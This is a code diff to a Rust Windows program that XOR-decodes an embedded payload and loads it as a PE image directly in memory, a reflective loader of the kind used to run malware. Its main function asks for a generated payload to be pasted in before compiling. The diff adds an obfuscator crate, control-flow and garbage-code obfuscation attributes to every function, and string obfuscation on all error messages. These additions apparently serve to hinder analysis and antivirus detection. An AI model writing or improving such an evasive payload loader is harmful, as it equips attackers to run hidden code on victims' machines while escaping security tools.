@@ -1,3 +1,5 @@
+use obfuscator::{obfuscate, obfuscate_string};
+
 #[cfg(windows)]
 mod syscalls;
 
@@ -102,16 +104,17 @@ const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
 
 #[cfg(windows)]
 const SECRET_KEY: &[u8] = &[
-    
+
 ];
 
 
 #[cfg(windows)]
 const PAYLOAD: &[u8] = &[
-  
+
 ];
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
     let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
     let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const ImageDataDirectory;
@@ -119,6 +122,7 @@ unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) 
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
     let characteristics = section.characteristics;
     let mut protect = PAGE_READONLY;
@@ -144,12 +148,13 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
         &mut old_protect,
     );
     if status != 0 {
-        return Err(format!("Failed to set section protection with status: {}", status));
+        return Err(format!("{}{}", obfuscate_string!("Failed to set section protection with status: "), status));
     }
     Ok(())
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let reloc_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_BASERELOC);
     if (*reloc_dir).virtual_address == 0 {
@@ -184,6 +189,7 @@ unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHea
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
     if (*import_dir).virtual_address == 0 {
@@ -195,7 +201,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
         let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
         let module = LoadLibraryA(dll_name_ptr as *const i8);
         if module.is_null() {
-            return Err(format!("Failed to load DLL: {:?} (error: {})", dll_name, GetLastError()));
+            return Err(format!("{}{:?}{}{}", obfuscate_string!("Failed to load DLL: "), dll_name, obfuscate_string!(" (error: "), GetLastError()));
         }
         let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
             image_base.add((*import_desc).original_first_thunk as usize) as *const usize
@@ -213,7 +219,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
                 GetProcAddress(module, func_name_ptr)
             };
             if func_addr.is_null() {
-                return Err(format!("Failed to import function (error: {})", GetLastError()));
+                return Err(format!("{}{}", obfuscate_string!("Failed to import function (error: "), GetLastError()));
             }
             *func_ref = func_addr as usize;
             thunk_ref = thunk_ref.add(1);
@@ -225,6 +231,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let tls_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_TLS);
     if (*tls_dir).virtual_address == 0 {
@@ -245,6 +252,7 @@ unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtH
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
         + mem::size_of::<u32>()
@@ -263,33 +271,34 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
-        return Err("PE data is too small for DOS header".to_string());
+        return Err(obfuscate_string!("PE data is too small for DOS header").to_string());
     }
 
     let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
     if dos_header.e_magic != 0x5A4D {
-        return Err("Invalid PE file (MZ signature missing)".to_string());
+        return Err(obfuscate_string!("Invalid PE file (MZ signature missing)").to_string());
     }
 
     let nt_headers_offset = dos_header.e_lfanew as usize;
     if nt_headers_offset == 0 || (nt_headers_offset + mem::size_of::<ImageNtHeaders64>()) > pe_data.len() {
-        return Err("Invalid NT header offset or file is too small.".to_string());
+        return Err(obfuscate_string!("Invalid NT header offset or file is too small.").to_string());
     }
 
     let nt_headers = &*(pe_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders64);
     if nt_headers.signature != 0x4550 {
-        return Err("Invalid PE signature".to_string());
+        return Err(obfuscate_string!("Invalid PE signature").to_string());
     }
 
     if nt_headers.optional_header.magic != 0x20b {
-        return Err("Loader only supports 64-bit (x64) PE files.".to_string());
+        return Err(obfuscate_string!("Loader only supports 64-bit (x64) PE files.").to_string());
     }
 
     let image_size = nt_headers.optional_header.size_of_image as usize;
     if image_size == 0 {
-        return Err("Invalid PE file (SizeOfImage is zero)".to_string());
+        return Err(obfuscate_string!("Invalid PE file (SizeOfImage is zero)").to_string());
     }
 
     let mut image_base: *mut std::ffi::c_void = ptr::null_mut();
@@ -304,7 +313,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     );
 
     if status != 0 {
-        return Err(format!("Memory allocation failed with status: {}", status));
+        return Err(format!("{}{}", obfuscate_string!("Memory allocation failed with status: "), status));
     }
 
     let headers_size = nt_headers.optional_header.size_of_headers as usize;
@@ -344,6 +353,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
 }
 
 #[cfg(windows)]
+#[obfuscate(garbage = true, control_f = true)]
 fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
     if key.is_empty() {
         return data.to_vec();
@@ -351,11 +361,12 @@ fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
     data.iter().enumerate().map(|(i, byte)| byte ^ key[i % key.len()]).collect()
 }
 
+#[obfuscate(main = true, garbage = true, control_f = true)]
 fn main() {
     #[cfg(windows)]
     {
         if PAYLOAD.is_empty() {
-            eprintln!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling.");
+            eprintln!("{}", obfuscate_string!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling."));
             return;
         }
 
@@ -363,13 +374,13 @@ fn main() {
 
         unsafe {
             if let Err(e) = load_pe_from_memory(&decoded_payload) {
-                eprintln!("[ERROR] Failed to load PE from memory: {}", e);
+                eprintln!("{}{}", obfuscate_string!("[ERROR] Failed to load PE from memory: "), e);
             }
         }
     }
 
     #[cfg(not(windows))]
     {
-        eprintln!("[ERROR] This program is intended to run on Windows only.");
+        eprintln!("{}", obfuscate_string!("[ERROR] This program is intended to run on Windows only."));
     }
 }
